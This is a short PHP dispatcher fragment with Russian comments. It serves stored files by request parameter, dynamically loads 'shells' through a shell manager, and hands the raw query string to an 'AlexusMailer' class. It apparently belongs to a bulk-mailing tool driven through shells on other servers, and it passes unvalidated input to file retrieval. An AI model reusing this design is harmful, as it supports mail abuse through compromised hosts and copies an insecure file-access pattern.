<?php
//Выдача файлов из хранилища
if(isset($_GET['fileRequest']) && $_GET['fileRequest']!="") {
	$filesContainer->get($_GET['fileRequest']);
	exit;
}
//Динамическая загрузка шеллов
$shellManager->loadShells();

//Обработка запросов
if(isset($_SERVER['QUERY_STRING']) && $_SERVER['QUERY_STRING']!="") {
	$alexusMailer=new AlexusMailer($_SERVER['QUERY_STRING'], $boundary, $logpass, $shellManager, isset($_POST['type'])?$_POST['type']:"html");
	print $alexusMailer->getOutput();
	exit;
}
?>